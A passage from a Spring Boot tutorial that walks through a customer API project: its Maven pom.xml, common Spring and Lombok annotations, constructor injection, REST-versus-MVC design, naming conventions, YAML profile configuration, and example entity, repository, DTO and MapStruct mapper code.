- **`mapper`**: Classes that map entities to DTOs and vice versa. In this case I will use MapStruct for compile-time
  mapping.
- **`repository`**: Data access layer using Spring Data JPA repositories.
- **`service`**: Business logic layer, including interfaces and their implementations.
- **`utils`**: Utility classes and helpers used across the application.

---

## 3. Introduction to Maven and `pom.xml`

### What is Maven?

Maven is a powerful build automation and project management tool that is widely used in Java projects. It helps manage
project builds, dependencies, and configurations in a standardized way. Maven centralizes the project’s setup in a file
called the **Project Object Model (POM)**, which is typically located in the `pom.xml` file at the root of your project.

### What is a POM?

The **Project Object Model (POM)** is the core of a Maven project. It’s an XML file that defines the structure,
dependencies, and build configuration of your project. When Maven runs, it reads the `pom.xml` file to determine how to
build, test, and package your application.

### Key Concepts in the POM

#### Project Coordinates:

- **`groupId`**: Identifies your project’s group, typically following the reverse domain name pattern of your company or
  organization. For example, if your company’s domain is `ainigma100.com`, your `groupId` might be `com.ainigma100`.
  This convention helps to ensure uniqueness across all projects globally by using a domain that the organization owns
  or controls.
- **`artifactId`**: The name of your project or module (e.g., `customer-api`). It represents the artifact, which is
  usually the output of the project, such as a JAR file.
- **`version`**: The current version of your project (e.g., `0.0.1-SNAPSHOT`). It indicates the specific iteration of
  the project, helping in managing releases and dependencies.

#### Dependencies:

Dependencies define the external libraries your project needs to function. These are specified in the `<dependencies>`
section of the `pom.xml` and are automatically downloaded and included by Maven.

#### Plugins:

Plugins extend the functionality of Maven and are used to perform various build-related tasks, such as compiling code,
running tests, and packaging the application. They are specified in the `<build>` section of the `pom.xml`.

### Example `pom.xml` file for Customer API

<details>
  <summary>View pom file</summary>

```xml
<?xml version=""1.0"" encoding=""UTF-8""?>
<project xmlns=""http://maven.apache.org/POM/4.0.0"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>3.3.2</version>
        <relativePath/> <!-- lookup parent from repository -->
    </parent>

    <groupId>com.ainigma100</groupId>
    <artifactId>customer-api</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <name>customer-api</name>
    <description>customer-api</description>

    <properties>
        <java.version>21</java.version>
        <maven.compiler.source>21</maven.compiler.source>
        <maven.compiler.target>21</maven.compiler.target>
        <springdoc-openapi-starter-webmvc-ui.version>2.6.0</springdoc-openapi-starter-webmvc-ui.version>
        <org.mapstruct.version>1.6.2</org.mapstruct.version>
        <lombok-mapstruct-binding.version>0.2.0</lombok-mapstruct-binding.version>
    </properties>

    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-data-jpa</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-actuator</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-validation</artifactId>
        </dependency>
        <dependency>
            <groupId>com.h2database</groupId>
            <artifactId>h2</artifactId>
            <scope>runtime</scope>
        </dependency>
        <dependency>
            <groupId>org.projectlombok</groupId>
            <artifactId>lombok</artifactId>
            <optional>true</optional>
        </dependency>
        <dependency>
            <groupId>org.mapstruct</groupId>
            <artifactId>mapstruct</artifactId>
            <version>${org.mapstruct.version}</version>
        </dependency>
        <dependency>
            <groupId>org.springdoc</groupId>
            <artifactId>springdoc-openapi-starter-webmvc-ui</artifactId>
            <version>${springdoc-openapi-starter-webmvc-ui.version}</version>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-compiler-plugin</artifactId>
                <version>${maven-compiler-plugin.version}</version>
                <configuration>
                    <source>${maven.compiler.source}</source>
                    <target>${maven.compiler.target}</target>
                    <annotationProcessorPaths>
                        <path>
                            <groupId>org.mapstruct</groupId>
                            <artifactId>mapstruct-processor</artifactId>
                            <version>${org.mapstruct.version}</version>
                        </path>
                        <path>
                            <groupId>org.projectlombok</groupId>
                            <artifactId>lombok</artifactId>
                        </path>
                        <path>
                            <groupId>org.projectlombok</groupId>
                            <artifactId>lombok-mapstruct-binding</artifactId>
                            <version>${lombok-mapstruct-binding.version}</version>
                        </path>
                    </annotationProcessorPaths>
                </configuration>
            </plugin>
        </plugins>
    </build>
</project>
```

</details>

### Dependencies Included

This `pom.xml` includes several important dependencies:

- **Spring Boot Starter Web**: Provides the necessary components to build a web application, including an embedded
  Tomcat server.
- **Spring Boot Starter Data JPA**: Simplifies database interactions by integrating Spring Data JPA for database
  operations.
- **Spring Boot Starter Actuator**: Adds production-ready features such as monitoring and metrics.
- **Spring Boot Starter Validation**: Facilitates data validation using Hibernate Validator. It allows you to use some
  annotations to validate an object.
- **H2 Database**: A lightweight in-memory database often used for testing and development.
- **Lombok**: Reduces boilerplate code by generating getters, setters, constructors, and other methods at compile time.
- **MapStruct**: A code generator that simplifies the mapping between Java beans.
- **SpringDoc OpenAPI**: Integrates Swagger/OpenAPI support into Spring Boot applications for API documentation.
- **Spring Boot Starter Test**: Provides testing libraries like JUnit, Mockito, and Spring TestContext Framework for
  unit and integration testing.

### Adding More Dependencies

As your project evolves, you might need additional libraries or tools. You can add more dependencies by searching for
them in the [Maven Central Repository](https://mvnrepository.com/) and including them in the `<dependencies>`
section of your `pom.xml`.

### Explanation of Plugin Configuration

In the `<build>` section of the `pom.xml`, we configure the Maven Compiler Plugin with additional settings for Lombok
and MapStruct:

- **Lombok**: Since Lombok generates code during the compilation phase (e.g., constructors, getters, setters), it
  requires an annotation processor. The plugin configuration ensures that Lombok's annotation processor is included,
  allowing Lombok to function correctly during compilation.


- **MapStruct**: MapStruct is a code generator that automatically creates mappers for converting between different
  Java beans. Like Lombok, MapStruct requires an annotation processor to generate the necessary code during compilation.
  The plugin configuration includes the MapStruct processor, ensuring that the mappings are generated correctly.


- **Lombok-MapStruct Binding**: MapStruct and Lombok both operate during the annotation processing phase, but they
  sometimes need to coordinate to avoid conflicts. The `lombok-mapstruct-binding` dependency ensures that Lombok's
  generated code is compatible with MapStruct, allowing both tools to work together seamlessly. This binding is
  configured in the `annotationProcessorPaths` section of the Maven Compiler Plugin, ensuring that the processors
  are run in the correct order.

By configuring these plugins, we ensure that Lombok, MapStruct, and their integration work seamlessly during the build
process, reducing manual coding effort and improving efficiency.

---

## 4. Key Annotations in Spring Boot

In this section, we’ll walk through the key annotations used across the various classes in the example project,
explaining their purpose and best practices. These annotations are essential for managing dependencies, handling HTTP
requests, mapping database entities, and more. Note that we will cover annotations specific to Spring Boot separately
from those provided by Lombok.

### 1. Spring Boot Annotations

These annotations are core to Spring Boot and are used throughout the application to define its structure and behavior.

#### 1.1 Dependency Injection and Component Scanning

- **`@Autowired`**: This annotation is used for automatic dependency injection. It can be applied to constructors,
  methods, fields, and even parameters to inject dependencies wherever they are needed, not just in service classes.
  When used on a constructor, it can be omitted if the class has only one constructor.

- **`@Component`**, **`@Service`**, **`@Repository`**, **`@RestController`**: These annotations are specializations of
  `@Component` and are used to define Spring beans. They indicate that a class is a Spring-managed component and can be
  automatically detected during component scanning. `@RestController` is a specialization of `@Controller` used for
  handling web requests and returning data directly as a response (usually JSON), combining the behavior of
  `@Controller` and `@ResponseBody`.

#### 1.2 Entity Class Annotations

- **`@Entity`**: Marks the class as a JPA entity, meaning it is mapped to a database table.
- **`@Table(name = ""customers"")`**: Specifies the table name in the database that this entity maps to.
- **`@Id`**: Denotes the primary key of the entity.
- **`@GeneratedValue(strategy = GenerationType.IDENTITY)`**: Specifies the primary key generation strategy.
- **`@Column`**: Marks a field as a column in the database. It can include attributes like `nullable`, `unique`, and
  `length`.
- **`@CreationTimestamp`** and **`@UpdateTimestamp`**: Automatically manage the creation and update timestamps of the
  entity.

#### 1.3 Controller Class Annotations

- **`@RestController`**: Combines `@Controller` and `@ResponseBody`, used to handle HTTP requests and return responses
  directly, usually as JSON. It is the preferred annotation for RESTful web services.

- **`@RequestMapping(""/api/v1/customers"")`**: Maps HTTP requests to specific methods in the controller, providing a base
  path for all endpoints within the controller.

- **`@GetMapping`, `@PostMapping`, `@PutMapping`, `@DeleteMapping`**: These annotations map HTTP GET, POST, PUT, and
  DELETE requests to specific methods in the controller, respectively.

- **`@Valid`**: Used to trigger validation of the request body or path variables based on constraints defined in the
  DTO.

- **`@RequestBody`**: Maps the HTTP request body to a Java object, commonly used in POST and PUT methods.

- **`@PathVariable`**: Binds a method parameter to a URI template variable, allowing extraction of values from the URL.

- **`@RequestParam`**: Binds a method parameter to a query parameter in the URL, useful for passing optional or required
  parameters to an endpoint.

#### 1.4 Configuration and Bean Management

- **`@Configuration`**: Indicates that the class contains Spring bean definitions and configuration settings.
- **`@Bean`**: Marks a method as a bean producer in Spring’s application context. This method’s return value is
  registered as a Spring bean.
- **`@Value`**: This annotation is used to pull configuration values from your properties file and inject them directly
  into your code.

#### 1.5. Event Handling

- **`@EventListener`**: This annotation is used to mark a method as an event listener, which listens for specific events
  within the Spring application lifecycle. For example, `@EventListener(ApplicationReadyEvent.class)` triggers when the
  application is ready to service requests.

### 2. Lombok Annotations

Lombok is a Java library that helps reduce boilerplate code by automatically generating common code like constructors,
getters, setters, etc. It is not part of Spring Boot but is often used alongside it for convenience.

- **`@Slf4j`**: Creates a `Logger` instance in the class, allowing for easy logging without manually defining a logger.

- **`@AllArgsConstructor`, `@NoArgsConstructor`, and `@RequiredArgsConstructor`**:
    - **`@AllArgsConstructor`**: Generates a constructor with parameters for all fields in the class.
    - **`@NoArgsConstructor`**: Generates a no-argument constructor.
    - **`@RequiredArgsConstructor`**: Generates a constructor for all final fields and any fields marked as `@NonNull`.

- **`@Data`**: Generates getters, setters, `equals()`, `hashCode()`, `toString()`, and other utility methods. While it
  is suitable for DTOs and simple data carrier classes, it is generally not recommended for JPA entities due to
  potential performance issues and complications with `equals()` and `hashCode()` methods.

- **`@Builder`**: Implements the builder pattern, making it easy to create immutable objects with only the required
  fields set.

### Additional Notes

There are many more annotations in Spring Boot that you might encounter as your application grows or as you write
tests (unit tests, integration tests, etc.). Each layer of the application (controller, service, repository, etc.) and
each use case (security, data validation, testing) has specific annotations that help to streamline development and
improve code quality. This section covers the key annotations used in this project, providing a solid foundation for
understanding how they work together in a Spring Boot application.

---

## 5. Dependency Injection in Spring Boot

Dependency Injection (DI) is a core concept in Spring that allows your classes to be loosely coupled. This means that
instead of your classes creating their dependencies, Spring will provide the dependencies they need. This makes your
code easier to manage, test, and maintain.

### Why Use Dependency Injection?

- **Simplifies Code**: You don’t need to create objects manually.
- **Easier Testing**: You can easily swap out dependencies with mock objects during testing.
- **Loose Coupling**: Your classes depend on abstractions (interfaces) rather than concrete implementations.

### Constructor Injection

Constructor injection is the preferred way to inject dependencies in Spring Boot. This means that you pass the
dependencies into a class through its constructor. This makes your classes more straightforward and ensures all
necessary dependencies are available when the object is created.

Here’s how it looks:

```java

@Service
public class CustomerService {

    private final CustomerRepository customerRepository;

    // Constructor Injection
    public CustomerService(CustomerRepository customerRepository) {
        this.customerRepository = customerRepository;
    }
}
```

In the example above, CustomerService depends on CustomerRepository. Spring automatically provides CustomerRepository
when creating a CustomerService instance.

### Using Lombok to Simplify Constructor Injection

In this project, I am using Lombok annotations to reduce boilerplate code. With Lombok, you can avoid writing
constructors manually by using the @RequiredArgsConstructor annotation. This automatically creates a constructor for all
final fields and autowires the dependencies.

```java

@Service
@RequiredArgsConstructor
public class CustomerService {

    private final CustomerRepository customerRepository;

    // Lombok automatically creates the constructor for you!
}
```

### The @Autowired Annotation

The `@Autowired` annotation tells Spring to automatically inject the required dependencies. In constructor injection, if
you have only one constructor, Spring will automatically inject dependencies without needing @Autowired.

#### Without using Lombok annotation

If you are not using Lombok, you can still use constructor injection like this:

```java

@Service
public class CustomerService {

    private final CustomerRepository customerRepository;

    @Autowired  // Optional with a single constructor
    public CustomerService(CustomerRepository customerRepository) {
        this.customerRepository = customerRepository;
    }
}
```

### Why Constructor Injection is Better

- **Clearer Dependencies**: It’s obvious which dependencies your class needs.
- **Immutable Fields**: Dependencies can be marked as `final`, ensuring they aren’t changed after they’re set.
- **Easier to Test**: You can easily provide mock dependencies when testing.

**Note:** Please search online for more details and try to understand this topic because it is important.

---

## 6. Design Patterns: RESTful API vs. MVC

When building applications with Spring Boot, it's essential to understand the different design patterns that can be used
to structure your application. The two most common patterns are **RESTful API** and **Model-View-Controller (MVC)**.
Each serves a different purpose and is chosen based on the needs of the application.

### 1. RESTful API (Service-Oriented Architecture)

- **Pattern Name:** **RESTful API** or **Service-Oriented Architecture (SOA)**
- **Annotation:** `@RestController`
- **Purpose:** The RESTful API pattern is designed to expose data and services over HTTP. In this architecture, the
  server does not concern itself with the presentation layer (UI). Instead, it focuses on delivering data, usually in
  JSON or XML format, which is consumed by a client (like a frontend framework such as Angular, React, or Vue.js).
- **Use Case:** This approach is ideal for applications where the frontend is developed separately from the backend. It
  allows for flexibility, as the frontend can be updated independently of the backend, and the same backend can serve
  multiple clients (web, mobile, etc.).

### 2. Model-View-Controller (MVC)

- **Pattern Name:** **Model-View-Controller (MVC)**
- **Annotation:** `@Controller`
- **Purpose:** The MVC pattern is a traditional approach where the server is responsible for both processing data and
  rendering the user interface. The `@Controller` annotation is used to handle HTTP requests and return views (typically
  HTML) that are rendered on the server side using templating engines like Thymeleaf.
- **Use Case:** MVC is suitable for monolithic applications where the server-side code manages both the business logic
  and the presentation logic. It’s often used in applications where the frontend is tightly coupled with the backend,
  and there's less need for a separate API layer.

### Differences Between RESTful API and MVC

- **Separation of Concerns:**
    - **RESTful API:** Decouples the backend from the frontend. The server provides data, while the client handles the
      presentation.
    - **MVC:** The server manages both data processing and presentation, offering a tightly integrated solution.

- **Flexibility:**
    - **RESTful API:** Offers greater flexibility as the backend can serve multiple types of clients, and the frontend
      can be updated independently.
    - **MVC:** Less flexible because the frontend and backend are tightly coupled, making it harder to update one
      without impacting the other.

- **Scalability:**
    - **RESTful API:** Easier to scale horizontally as the server's responsibilities are limited to providing data.
    - **MVC:** Can be more challenging to scale because the server handles both the data and the presentation logic.

- **Development Speed:**
    - **RESTful API:** Faster for teams working on large applications with separate frontend and backend teams.
    - **MVC:** Faster for small to medium-sized projects where one team handles both frontend and backend, and where
      integrating the two layers is straightforward.

### Choosing the Right Pattern

The choice between RESTful API and MVC depends on your project requirements:

- **Use RESTful API** if:
    - Your frontend is built with modern JavaScript frameworks.
    - You need to serve multiple types of clients.
    - You prefer a decoupled architecture that allows for more flexibility and easier maintenance.

- **Use MVC** if:
    - Your application is relatively simple, and the frontend is tightly coupled with the backend.
    - You want to leverage server-side rendering for better SEO or faster initial page loads.
    - You’re building a monolithic application where integrating UI and backend logic is straightforward and beneficial.

---

## 7. Naming Conventions

Consistent naming conventions in your codebase and API design make your project easier to navigate, maintain, and scale.
Below are some guidelines for naming conventions in a Spring Boot project focused on a customer-related API.

### Package Naming

- **Lowercase and Singular**: Package names should be in lowercase and singular. This enhances readability and
  consistency.
    - **Example**: `com.example.customerapi.controller`, `com.example.customerapi.service`
- **No Special Characters**: Avoid using special characters or underscores in package names. Stick to simple,
  descriptive names.
    - **Example**: `com.example.customerapi.repository` (not `com.example_customerapi.repository`)

### Class Naming

- **PascalCase**: Class names should follow PascalCase, where each word starts with an uppercase letter. This is a
  widely accepted convention in Java.
    - **Example**: `CustomerService`, `CustomerController`, `CustomerRepository`
- **Meaningful Names**: Choose descriptive names that clearly indicate the purpose of the class.
    - **Example**: `CustomerNotificationService` instead of `NotificationHelper`

### Entity Naming

- **Singular Form**: Entity classes should be named in the singular form to represent a single instance of the entity.
    - **Example**: `Customer`, `Address`, `Order`
- **Mapped to Plural Table Names**: Entities often map to plural table names in the database.
    - **Example**: `Customer` class maps to `customers` table, `Order` class maps to `orders` table

### API Endpoint Naming

- **Plural Nouns**: Use plural nouns for API endpoints to represent collections of resources.
    - **Example**: `/customers`, `/orders`, `/addresses`


- **Lowercase with Hyphens**: Endpoint paths should be lowercase, with hyphens separating words for readability.
    - **Example**: `/customers/{customerId}/orders`, `/orders/{orderId}/items`, `/customers/{customerId}/addresses`


- **Avoid Verbs in URIs**: Use nouns to represent resources. The HTTP method (GET, POST, PUT, DELETE) should define the
  action, not the URI.
    - **Bad Examples**: `/getCustomers`, `/createOrder`, `/deleteCustomer`
    - **Good Examples**: `/customers` (GET), `/orders` (POST), `/customers/{id}` (DELETE)


- **Use Forward Slashes (/) for Hierarchy**: Forward slashes are used to indicate a hierarchical relationship between
  resources.
    - **Example**: `/customers/{customerId}/orders`, `/customers/{customerId}/addresses`


- **Do Not Use Trailing Slashes**: Avoid trailing slashes at the end of the URI.
    - **Bad Example**: `/customers/`
    - **Good Example**: `/customers`


- **Use Query Parameters for Filtering**: When filtering collections, use query parameters instead of creating new
  endpoints.
  In some cases you may see filtering and sorting information provided as a payload inside a request body.
    - **Example**: `/customers?status=active`, `/orders?customerId=123&status=pending`

---

## 8. Configuring `application.yaml`

The `application.yaml` file is an essential configuration file in a Spring Boot project. It allows you to manage your
application's settings in a clear and structured manner. YAML is preferred over properties files in many cases because
it is easier to read and supports hierarchical data.

### Why `application.yaml`?

When you create a new Spring Boot project, the default configuration file is named `application.properties`. However,
many developers choose to use `application.yaml` instead, as it offers a more concise and readable format, especially
when dealing with complex configurations.

### General Configuration

The main `application.yaml` file typically includes common settings that apply to all environments, such as server
configuration, application name, and basic Spring settings.

### Environment-Specific Configuration

In addition to the main `application.yaml` file, you can create environment-specific YAML files, such as
`application-dev.yaml` for development, `application-uat.yaml` for user acceptance testing, and `application-prod.yaml`
for production. These files contains settings specific to each environment, allowing you to easily switch between
configurations without changing your code.

### Activating Profiles

You can activate a specific profile in several ways:

- **In `application.yaml`**: You can specify the active profile directly in the `application.yaml` file using the
  `spring.profiles.active` property. This is useful for setting a default profile that will be used unless another is
  specified at runtime.
- **At Runtime**: You can also activate a profile at runtime by passing the `spring.profiles.active` property as a
  command-line argument or setting it as an environment variable.

### Best Practices

- **Keep It Simple**: Store common settings in the main `application.yaml` and use environment-specific files for
  configuration differences.
- **Use Profiles**: Profiles help manage different environments like development, testing, and production by allowing
  you to specify environment-specific configurations.
- **YAML Advantages**: The YAML format is preferred for its readability and ability to handle complex, hierarchical
  settings more gracefully than traditional properties files.

### Example `application.yaml` and `application-dev.yaml` files for Customer API

In this section, I provide two YAML configuration files to demonstrate some of the settings I use for a Spring Boot
project. These are just examples, and many other configurations are available depending on your project's needs. As I
continue to develop this project, I may add more configurations.

#### application.yaml

This file contains general settings that apply to all environments. Here’s a breakdown of the configurations used:

- **`server.port`**: Specifies the port on which the application will run. In this case, it’s set to `8088`. If you do
  not specify the port, the app will start on a `default port` which is `8080`.
- **`server.servlet.context-path`**: Defines the base URL path for the application. Here, it’s dynamically set to the
  artifact ID of the project.
- **`server.shutdown.graceful`**: Enables graceful shutdown, ensuring that the application completes ongoing requests
  before shutting down.
- **`spring.profiles.active`**: Indicates the active profile to be used. In this case, the development profile (`dev`)
  is active.
- **`spring.application.name`**: Sets the application name, dynamically pulled from the project configuration.
- **`spring.lifecycle.timeout-per-shutdown-phase`**: Configures the timeout for each shutdown phase, here set to
  `25 seconds`.
- **`spring.output.ansi.enabled`**: Controls ANSI output in the console, set to `always` to ensure colored output.
- **`springdoc.swagger-ui.path`**: Sets the path for accessing the Swagger UI, useful for API documentation.
- **`springdoc.title`** and **`springdoc.version`**: Define the title and version of the API documentation, again
  dynamically set based on project properties.
- **`openapi.output.file`**: Specify the file name of the swagger file that will be generated by `OpenApiConfig` class
  on start-up. It will be the documentation of the application.

```yaml
server:
  port: 8088
  servlet:
    context-path: '/@project.name@'
  shutdown: graceful

spring:
  profiles:
    active: dev # Specify the active profile

  application:
    name: '@project.name@'
  lifecycle:
    timeout-per-shutdown-phase: 25s

  output:
    ansi:
      enabled: always

springdoc:
  swagger-ui:
    path: /ui
  title: 'Customer API'
  version: '@springdoc-openapi-starter-webmvc-ui.version@'

openapi:
  output:
    file: 'openapi-@project.name@.json'
```

#### application-dev.yaml

This file contains settings specific to the development environment. Here's what each setting does:

- **`datasource.url`**: Configures the JDBC URL for the H2 database. In this example, the database is stored in a local
  file (`./data/customer-db`) with `AUTO_SERVER=true` to allow remote connections.
- **`datasource.username` and `datasource.password`**: Set the database username and password. The default username (
  `sa`) is used with no password.
- **`datasource.driver-class-name`**: Specifies the JDBC driver class for the H2 database.
- **`jpa.show-sql`**: Enables logging of SQL statements generated by Hibernate.
- **`jpa.properties.hibernate.format_sql`**: Formats SQL output to be more readable.
- **`jpa.properties.hibernate.dialect`**: Specifies the Hibernate dialect to use, which is set to `H2Dialect` for
  compatibility with the H2 database.
- **`jpa.generate-ddl`**: Automatically generates database schema (DDL) from JPA entities.
- **`jpa.hibernate.ddl-auto`**: Controls the behavior of schema generation at runtime, with `update` allowing for
  incremental updates to the schema.

### Notes:

- These configurations are just examples based on what I use in this project. There are many other configurations you
  can apply depending on your project's needs.
- As the project evolves, I may add more configurations to enhance functionality or address specific needs.
- Feel free to explore additional configurations and adjust these examples to fit your project requirements.

**Feedback and Contributions**: If you have suggestions or improvements, please share them. Collaboration is key to
refining this guide and making it a valuable resource for all developers.

```yaml
datasource:
  url: jdbc:h2:file:./data/notification-manager-db;AUTO_SERVER=true
  username: sa
  password:
  driver-class-name: org.h2.Driver
jpa:
  show-sql: true
  properties:
    hibernate:
      format_sql: true
      dialect: org.hibernate.dialect.H2Dialect
  generate-ddl: true
  hibernate:
    ddl-auto: update
```

---

## 9. Detailed Package Breakdown

### Entity Layer

- **Purpose**: The entity layer represents the database tables in the form of JPA entities. Each entity class typically
  maps to a single table in the database.

- **Package**: `entity`

- **Example Classes**:
    - `Customer.java`: Represents the `customers` table.

- **Key Annotations**:
    - `@Entity`: Marks a class as a JPA entity.
    - `@Table(name = ""table_name"")`: Specifies the name of the table in the database.
    - `@Id`: Indicates the primary key of the entity.
    - `@GeneratedValue(strategy = GenerationType.IDENTITY)`: Defines the strategy for primary key generation.

<details>
  <summary>View Customer code</summary>

```java
package com.ainigma100.customerapi.entity;

import jakarta.persistence.*;
import lombok.*;
import org.hibernate.annotations.CreationTimestamp;
import org.hibernate.annotations.UpdateTimestamp;
import org.hibernate.proxy.HibernateProxy;

import java.time.LocalDate;
import java.time.LocalDateTime;
import java.util.Objects;

@Getter
@Setter
@ToString
@NoArgsConstructor
@AllArgsConstructor
@Entity
@Table(name = ""customers"")
public class Customer {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(nullable = false)
    private String firstName;

    @Column(nullable = false)
    private String lastName;

    @Column(nullable = false, unique = true)
    private String email;

    private String phoneNumber;

    private LocalDate dateOfBirth;

    @CreationTimestamp
    @Column(nullable = false, updatable = false)
    private LocalDateTime createdDate;

    @UpdateTimestamp
    private LocalDateTime updatedDate;

    @Override
    public final boolean equals(Object o) {
        if (this == o) return true;
        if (o == null) return false;
        Class<?> oEffectiveClass = o instanceof HibernateProxy hibernateProxy ? hibernateProxy.getHibernateLazyInitializer().getPersistentClass() : o.getClass();
        Class<?> thisEffectiveClass = this instanceof HibernateProxy hibernateProxy ? hibernateProxy.getHibernateLazyInitializer().getPersistentClass() : this.getClass();
        if (thisEffectiveClass != oEffectiveClass) return false;
        Customer customer = (Customer) o;
        return getId() != null && Objects.equals(getId(), customer.getId());
    }

    @Override
    public final int hashCode() {
        return this instanceof HibernateProxy hibernateProxy ? hibernateProxy.getHibernateLazyInitializer().getPersistentClass().hashCode() : getClass().hashCode();
    }
}
```

</details>

### Why Not Use `@Data`?

While `@Data` is a convenient annotation provided by Lombok that generates getters, setters, `toString()`, `equals()`,
and `hashCode()` methods, it is not recommended for use with JPA entities (I got this warning from JPA Buddy plugin).
Using `@Data` in JPA entities can lead to severe performance and memory consumption issues. Additionally, `@Data`
generates `equals()` and `hashCode()` methods that might not be suitable for entities, particularly in cases involving
entity relationships and lazy loading.

### Importance of `equals()` and `hashCode()`

- **`equals()`**: This method determines whether two instances are considered equal. For JPA entities, this typically
  means comparing the primary key (ID). Properly implementing `equals()` ensures that the entity behaves correctly when
  compared in collections or when managed by the persistence context.


- **`hashCode()`**: This method provides a hash code for the entity, which is essential for its use in hash-based
  collections like `HashSet` or `HashMap`. Properly implementing `hashCode()` ensures consistency and correctness when
  the entity is stored or retrieved from such collections.

For more details on why these methods are important and best practices for implementing them, you can find  
resources and discussions online.

### Additional Column Specification

You can also specify the name of the column in the database using the `@Column(name = ""column_name"")` annotation.
This is useful when the field name in the entity class differs from the column name in the database table.

**Example**:

```java

@Column(name = ""first_name"", nullable = false)
private String firstName;
```

**Note**: If you do not specify the column name and the property is in camelCase, the column name will automatically be
converted to snake_case in most databases. For example, if your entity has a field named `firstName`, it will be mapped
to a column named `first_name` by default.

<br><br>

### Repository Layer

- **Purpose**: The repository layer handles CRUD operations for entities using Spring Data JPA, allowing you to
  interact with the database without writing SQL.
- **Package**: `repository`
- **Example Class**:
    - `CustomerRepository.java`: Manages CRUD operations for the `Customer` entity.

- **Key Concepts**:
    - **`extends JpaRepository<Customer, Long>`**: By extending `JpaRepository`, Spring Boot automatically configures a
      repository bean for you. This bean is a proxy implementation of `SimpleJpaRepository`, which provides all the
      necessary CRUD operations and query methods for the `Customer` entity. No need for `@Repository` or `@Component`
      annotations—Spring handles the configuration.

<details>
  <summary>View CustomerRepository code</summary>

```java
package com.ainigma100.customerapi.repository;

import com.ainigma100.customerapi.entity.Customer;
import org.springframework.data.jpa.repository.JpaRepository;

public interface CustomerRepository extends JpaRepository<Customer, Long> {

    Customer findByEmail(String email);

}
```

</details>

### Query Methods Overview

Spring Data JPA offers several ways to write queries in your repository interfaces, including:

#### 1. Derived Query Methods

You can create simple queries by following naming conventions.

**Example**:

```java
List<Customer> findByLastName(String lastName);
```

<br>

#### 2. Custom Queries with @Query

For more complex queries, you can use the @Query annotation.

**Example**:

```java
import org.springframework.data.repository.query.Param;

@Query(""SELECT c FROM Customer c WHERE c.email = :email"")
Customer findByEmail(@Param(""email"") String email);
```

<br>

#### 3. Native Queries

You can write native SQL queries using the @Query annotation and providing an extra parameter `nativeQuery = true`.

**Example**:

```java
import org.springframework.data.repository.query.Param;

@Query(value = ""SELECT * FROM customers WHERE status = :status"", nativeQuery = true)
List<Customer> findByStatus(@Param(""status"") String status);
```

<br>

### When to Use Native Queries

- **Advantages**: Native queries can be useful when you need to leverage database-specific features, optimize
  performance, or execute complex SQL that might not be easily expressed in JPQL (Java Persistence Query Language).


- **Disadvantages**: However, native queries can reduce the portability of your application across different database
  systems since they are tied to a specific SQL dialect. They also bypass some of the safety checks and optimizations
  provided by JPQL, such as automatic mapping of query results to entities.


- **Best Practice**: Prefer using JPQL or derived query methods for most queries to maintain portability and leverage
  JPA's features. Use native queries only when necessary for performance optimization or when dealing with complex
  queries that JPQL cannot handle efficiently.

<br><br>

### DTOs and MapStruct

DTOs (Data Transfer Objects) are used to transfer data between the service layer and the controller layer. They are
simple POJOs (Plain Old Java Objects) that contain only the necessary data and are often used to decouple the internal
entity models from the external API contract.

#### Key Concepts:

- **DTO Usage**:
    - DTOs ensure that only relevant information is exposed to the client. They help in shaping the data according to
      the needs of the client while hiding unnecessary internal details.
    - DTOs can also include validation annotations, ensuring that the data received or sent is valid according to
      business rules.


- **MapStruct for Mapping**:
    - **Automatic Mapping**: MapStruct automatically maps fields with the same name between entity classes and DTOs. For
      fields with different names, you can use the `@Mapping` annotation.
    - **Custom and Complex Mappings**: Allows custom mappings for complex scenarios, including nested objects and
      expression-based mappings.
    - **Performance**: MapStruct is efficient, generating simple, plain Java code for mappings without using reflection,
      making it faster than many other frameworks.
    - **Null Handling and Collection Mapping**: Offers control over how null values are handled and supports mapping
      between collections, such as lists of entities to lists of DTOs.
    - **Flexible Integration**: Easily integrates with Spring or other dependency injection frameworks by customizing
      the component model.

**Note**: You can find more information on MapStruct online.

Below is an example of a DTO and a corresponding MapStruct mapper interface:


<details>
  <summary>View CustomerDTO code</summary>

```java
package com.ainigma100.customerapi.dto;

import lombok.*;

import java.time.LocalDate;

@Getter
@Setter
@ToString
@NoArgsConstructor
@AllArgsConstructor
public class CustomerDTO {

    private Long id;
    private String firstName;
    private String lastName;
    private String email;
    private String phoneNumber;
    private LocalDate dateOfBirth;

}
```

</details>

<details>
  <summary>View CustomerMapper code</summary>

```java
package com.ainigma100.customerapi.mapper;

import com.ainigma100.customerapi.dto.CustomerDTO;
import com.ainigma100.customerapi.entity.Customer;
import org.mapstruct.Mapper;

import java.util.List;

@Mapper(componentModel = ""spring"")
public interface CustomerMapper {

    Customer toCustomer(CustomerDTO customerDTO);

    CustomerDTO toCustomerDTO(Customer customer);

    List<Customer> toCustomerList(List<CustomerDTO> customerDTOList);

    List<CustomerDTO> toCustomerDTOList(List<Customer> customerList);

}
```

</details>


<br><br>

### Service Layer

The service layer in a Spring Boot application contains the business logic of the application. It acts as an
intermediary
between the controller layer (handling HTTP requests) and the repository layer (interacting with the database).

#### Key Concepts:

- **Interface and Implementation**: It's a good practice to define a service interface and then provide its
  implementation.
  This approach promotes loose coupling and makes your code more modular and easier to test. The interface defines the
  contract for the service, while the implementation class contains the actual business logic.

  **Example**:
    - `CustomerService`: Interface that defines methods for customer-related operations.
